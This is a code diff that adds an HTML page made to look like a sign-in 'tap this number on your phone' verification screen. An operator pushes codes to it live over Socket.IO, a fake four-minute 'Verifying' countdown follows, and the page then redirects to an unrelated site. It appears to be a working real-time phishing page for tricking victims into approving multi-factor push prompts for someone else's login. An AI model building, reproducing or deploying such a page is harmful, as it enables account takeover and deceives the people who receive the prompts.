@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phone Verification</title>
+<!-- Load Socket.IO client library -->
+<script src="/socket.io/socket.io.js"></script>
+<style>
+  body { background-color: #121212; color: #e3e2e6; font-family: sans-serif; display: flex; justify-content: center; padding-top: 100px; margin: 0; }
+  .container { width: 400px; }
+  .input-group { position: relative; margin-bottom: 10px; }
+  .input-group input { width: 100%; background: transparent; border: 2px solid #8ab4f8; color: white; padding: 15px; font-size: 16px; border-radius: 6px; box-sizing: border-box; outline: none; pointer-events: none; }
+  .input-group label { position: absolute; top: -10px; left: 10px; background: #121212; padding: 0 5px; color: #8ab4f8; font-size: 14px; }
+  .timer-display { color: #f28b82; font-size: 14px; margin-bottom: 20px; text-align: right; min-height: 20px; font-weight: bold; }
+  .instruction { font-size: 18px; margin-bottom: 40px; }
+  .instruction span { color: #8ab4f8; }
+  .guest-mode { font-size: 14px; color: #9aa0a6; margin-bottom: 40px; line-height: 1.5; }
+  .guest-mode a { color: #8ab4f8; text-decoration: none; }
+  .actions { display: flex; justify-content: space-between; align-items: center; }
+  .create-account { color: #8ab4f8; text-decoration: none; font-weight: bold; }
+  
+  /* Next Button Styles */
+  .next-btn { background: #3c4043; color: #9aa0a6; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; cursor: not-allowed; transition: 0.2s; }
+  .next-btn.active { background: #8ab4f8; color: #121212; cursor: pointer; font-weight: bold; }
+
+  /* 4-Minute Loading State Styles */
+  .loading-container { display: none; margin-top: 25px; text-align: center; color: #8ab4f8; font-size: 15px; }
+  .spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(138, 180, 248, 0.3);
+    border-radius: 50%;
+    border-top-color: #8ab4f8;
+    animation: spin 1s ease-in-out infinite;
+    vertical-align: middle;
+    margin-right: 10px;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="input-group">
+      <label>Number</label>
+      <input type="text" id="numberInput" readonly placeholder="Waiting for number...">
+    </div>
+    
+    <div class="timer-display" id="timerText"></div>
+    
+    <div class="instruction">
+      Click these two digit number <span>on your phone</span>
+    </div>
+
+    <div class="guest-mode">
+      Not your phone? Use Guest mode to sign in privately.<br>
+      <a href="#">Learn more about using Guest mode</a>
+    </div>
+
+    <div class="actions">
+      <a href="#" class="create-account">Create account</a>
+      <button class="next-btn" id="nextBtn" disabled onclick="startLoadingProcess()">Next</button>
+    </div>
+
+    <!-- 4-Minute Loading Screen UI -->
+    <div class="loading-container" id="loadingContainer">
+      <div class="spinner"></div>
+      <span id="loadingText">Processing verification... (04:00)</span>
+    </div>
+  </div>
+
+  <script>
+    const socket = io(); 
+    const input = document.getElementById('numberInput');
+    const timerText = document.getElementById('timerText');
+    const nextBtn = document.getElementById('nextBtn');
+    const loadingContainer = document.getElementById('loadingContainer');
+    const loadingText = document.getElementById('loadingText');
+    
+    let timerInterval;
+    let loadingInterval;
+    let canClickNext = false;
+
+    // 60-Second Countdown when Admin pushes a number
+    function startTimer() {
+      let timeLeft = 60;
+      clearInterval(timerInterval);
+      
+      timerText.style.color = "#f28b82";
+      
+      timerInterval = setInterval(() => {
+        timeLeft--;
+        const displayTime = timeLeft < 10 ? `0${timeLeft}` : timeLeft;
+        timerText.innerText = `00:${displayTime}`;
+        
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          timerText.innerText = "00:00 - Expired";
+          timerText.style.color = "#9aa0a6";
+          
+          input.value = "";
+          input.placeholder = "Session expired. Waiting for new number...";
+          
+          // Disable button if time expires before clicking
+          nextBtn.disabled = true;
+          nextBtn.classList.remove('active');
+          canClickNext = false;
+        }
+      }, 1000);
+    }
+
+    // Listen for the incoming code from admin
+    socket.on('user_receive_code', (data) => {
+      input.value = data.code;
+      timerText.innerText = "00:60";
+      
+      // Enable the Next button ONLY after receiving code
+      canClickNext = true;
+      nextBtn.disabled = false;
+      nextBtn.classList.add('active');
+      
+      startTimer();
+    });
+
+    // Handle 4-minute loading process on Next button click
+    function startLoadingProcess() {
+      if (!canClickNext) return;
+
+      // Stop the 60-second timer
+      clearInterval(timerInterval);
+      timerText.innerText = "";
+
+      // Lock UI
+      canClickNext = false;
+      nextBtn.disabled = true;
+      nextBtn.classList.remove('active');
+      nextBtn.innerText = "Loading...";
+
+      // Show loading UI
+      loadingContainer.style.display = "block";
+
+      let secondsLeft = 240; // 4 minutes = 240 seconds
+
+      loadingInterval = setInterval(() => {
+        secondsLeft--;
+
+        const mins = Math.floor(secondsLeft / 60);
+        const secs = secondsLeft % 60;
+        const formattedMins = mins < 10 ? `0${mins}` : mins;
+        const formattedSecs = secs < 10 ? `0${secs}` : secs;
+
+        loadingText.innerText = `Verifying, please wait... (${formattedMins}:${formattedSecs})`;
+
+        if (secondsLeft <= 0) {
+          clearInterval(loadingInterval);
+          loadingContainer.innerHTML = '<span style="color: #81c995; font-weight: bold;">✓ Verification completed!</span>';
+          nextBtn.innerText = "Done";
+          
+          // Redirect to stripchat.com after countdown completes
+          window.location.href = "https://stripchat.com";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
